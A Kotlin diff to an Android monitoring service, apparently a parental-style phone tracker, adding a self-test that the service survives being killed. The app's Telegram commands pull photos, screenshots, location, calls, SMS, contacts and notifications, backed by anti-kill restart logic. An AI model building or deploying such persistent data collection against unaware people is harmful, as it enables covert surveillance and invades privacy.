@@ -167,6 +167,8 @@ class MonitoringService : Service() {
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
+        const val ACTION_LIVENESS_TEST = "LIVENESS_SELF_TEST"
+        private const val SELF_TEST_ALARM_DELAY_MS = 45_000L
         private const val HEX_DIGITS = "0123456789abcdef"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
@@ -176,9 +178,9 @@ class MonitoringService : Service() {
         private val PROMO_KEYWORDS = arrayOf("promo", "diskon", "discount", "cashback", "bonus", "hadiah", "undian", "pinjaman", "kredit", "cicilan", "belanja", "sale", "gratis", "klaim", "voucher", "kupon", "poin", "tukar")
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/heartbeat", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
-        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas", "/alive")
-        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/alive", "/heartbeat", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
-        private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas", "/alive", "/cekmati")
+        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/alive", "/cekmati", "/heartbeat", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
+        private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput", "cekmati" to "/cekmati", "ujimati" to "/cekmati")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val COMMAND_SILENT_AGE_SEC = 3600L
         private const val MUTATING_MAX_AGE_SEC = 300L
@@ -402,6 +404,16 @@ class MonitoringService : Service() {
                 startMonitoring()
                 return START_STICKY
             }
+            ACTION_LIVENESS_TEST -> {
+                if (isRunning) {
+                    runLivenessSelfTest()
+                    return START_STICKY
+                }
+                if (shouldAutoResume()) {
+                    startMonitoring()
+                }
+                return START_NOT_STICKY
+            }
             else -> {
                 if (shouldAutoResume()) {
                     startMonitoring()
@@ -578,6 +590,10 @@ class MonitoringService : Service() {
         }
         try {
             Liveness.noteServiceStart(this, preferencesManager)
+        } catch (_: Exception) {
+        }
+        try {
+            serviceScope.launch { reportLivenessSelfTest() }
         } catch (_: Exception) {
         }
         if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
@@ -1380,6 +1396,8 @@ class MonitoringService : Service() {
             "camback" -> "/camera belakang"
             "pause60" -> "/pause 60"
             "shot" -> "/screenshot"
+            "cekmati" -> "/cekmati"
+            "alive" -> "/alive"
             else -> return
         }
         val originOk = originChat.isNotEmpty() && originChat == chatId
@@ -1563,6 +1581,7 @@ class MonitoringService : Service() {
                 listOf(button("\uD83D\uDCF7 Front", "camfront"), button("\uD83D\uDCF7 Back", "camback")),
                 listOf(button("⏸️ Pause 60 min", "pause60"), button("▶️ Resume", "resume")),
                 listOf(button("\uD83D\uDD0B Battery", "battery"), button("\uD83D\uDCCA Status", "status")),
+                listOf(button("\uD83E\uDDEA Uji anti-mati", "cekmati"), button("\uD83D\uDC9A Alive", "alive")),
                 listOf(button("\uD83D\uDDA5 Screenshot", "shot"), button("⏹️ Stop", "stop"))
             )
         )
@@ -2229,6 +2248,9 @@ class MonitoringService : Service() {
             "/alive" -> {
                 sendToTelegram(aliveReportText(), mainMenu())
             }
+            "/cekmati" -> {
+                runLivenessSelfTest()
+            }
             "/heartbeat" -> {
                 if (arg.isBlank()) {
                     val hours = try { preferencesManager.heartbeatHours } catch (_: Exception) { 0 }
@@ -2564,6 +2586,7 @@ class MonitoringService : Service() {
                         appendLine("/version - versi app + HP")
                         appendLine("/uptime - lama service jalan")
                         appendLine("/alive - denyut terakhir + berapa kali dipulihkan")
+                        appendLine("/cekmati - uji anti-mati: servis dihentikan lalu lapor hasilnya")
                         appendLine("/heartbeat &lt;1-48|0&gt; - laporan berkala masih hidup")
                         appendLine("/contacts &lt;nama&gt; - cari kontak")
                         appendLine("/apps [N] - daftar aplikasi")
@@ -4539,6 +4562,74 @@ class MonitoringService : Service() {
         stopSelf()
     }
 
+    private fun selfTestPending(): Boolean {
+        return try { preferencesManager.liveTestPending } catch (_: Exception) { false }
+    }
+
+    private fun runLivenessSelfTest() {
+        try {
+            preferencesManager.liveTestPending = true
+            preferencesManager.liveTestStartedElapsed = android.os.SystemClock.elapsedRealtime()
+            preferencesManager.liveTestByAlarm = false
+        } catch (_: Exception) {
+        }
+        try {
+            Liveness.scheduleSoon(this, SELF_TEST_ALARM_DELAY_MS)
+        } catch (_: Exception) {
+        }
+        serviceScope.launch {
+            try {
+                sendToTelegram("🧪 <b>Uji anti-mati dimulai</b>\nServis saya hentikan paksa sekarang, lalu jam bangun (watchdog) harus menghidupkannya lagi dalam ±1 menit. Hasilnya saya laporkan ke sini.")
+            } catch (_: Exception) {
+            }
+            try {
+                delay(1_500L)
+            } catch (_: Exception) {
+            }
+            try {
+                Liveness.scheduleSoon(this@MonitoringService, SELF_TEST_ALARM_DELAY_MS)
+            } catch (_: Exception) {
+            }
+            try {
+                stopMonitoring()
+            } catch (_: Exception) {
+            }
+        }
+    }
+
+    private suspend fun reportLivenessSelfTest() {
+        val pending = try { preferencesManager.liveTestPending } catch (_: Exception) { false }
+        if (!pending) return
+        val startedElapsed = try { preferencesManager.liveTestStartedElapsed } catch (_: Exception) { 0L }
+        val byAlarm = try { preferencesManager.liveTestByAlarm } catch (_: Exception) { false }
+        try { preferencesManager.liveTestPending = false } catch (_: Exception) { }
+        try { preferencesManager.liveTestStartedElapsed = 0L } catch (_: Exception) { }
+        try { preferencesManager.liveTestByAlarm = false } catch (_: Exception) { }
+        if (startedElapsed <= 0L) return
+        val nowElapsed = android.os.SystemClock.elapsedRealtime()
+        if (startedElapsed > nowElapsed) {
+            try {
+                sendToTelegram("🧪 Uji anti-mati terputus oleh reboot HP — ulangi bila ingin hasil yang jelas.")
+            } catch (_: Exception) {
+            }
+            return
+        }
+        val secs = (nowElapsed - startedElapsed) / 1000L
+        try { preferencesManager.liveTestLastSec = secs.coerceAtMost(Int.MAX_VALUE.toLong()).toInt() } catch (_: Exception) { }
+        try { preferencesManager.liveTestLastAt = System.currentTimeMillis() } catch (_: Exception) { }
+        val text = if (secs > 10 * 60L) {
+            "❌ <b>Uji anti-mati gagal</b>\nServis baru hidup lagi setelah $secs detik (lebih dari 10 menit). Jam bangun tampaknya tidak berjalan — buka Setup &gt; Anti-kill dan kerjakan langkahnya, lalu uji lagi."
+        } else if (byAlarm) {
+            "🧪 <b>Hasil uji anti-mati</b>\nServis hidup lagi dalam <b>$secs detik</b>.\n✅ Dipulihkan jam bangun (watchdog) — anti-mati di HP ini <b>bekerja</b>."
+        } else {
+            "🧪 <b>Hasil uji anti-mati</b>\nServis hidup lagi dalam <b>$secs detik</b>.\n⚠️ Jam bangun belum terbukti — yang menghidupkan jalur lain (worker/boot). Kerjakan langkah Anti-kill di Setup lalu uji ulang."
+        }
+        try {
+            sendToTelegram(text)
+        } catch (_: Exception) {
+        }
+    }
+
     override fun onTaskRemoved(rootIntent: Intent?) {
         try {
             if (shouldAutoResume()) {
@@ -4622,17 +4713,28 @@ class MonitoringService : Service() {
     override fun onDestroy() {
         try {
             if (shouldAutoResume() || needsCredsRetry()) {
-                try {
-                    MessageScheduler.scheduleBootRestart(this)
-                } catch (_: Exception) {
-                }
-                try {
-                    MessageScheduler.scheduleWatchdog(this)
-                } catch (_: Exception) {
-                }
-                try {
-                    Liveness.schedule(this)
-                } catch (_: Exception) {
+                if (selfTestPending()) {
+                    try {
+                        Liveness.scheduleSoon(this, SELF_TEST_ALARM_DELAY_MS)
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        MessageScheduler.scheduleWatchdog(this)
+                    } catch (_: Exception) {
+                    }
+                } else {
+                    try {
+                        MessageScheduler.scheduleBootRestart(this)
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        MessageScheduler.scheduleWatchdog(this)
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        Liveness.schedule(this)
+                    } catch (_: Exception) {
+                    }
                 }
             } else {
                 try {
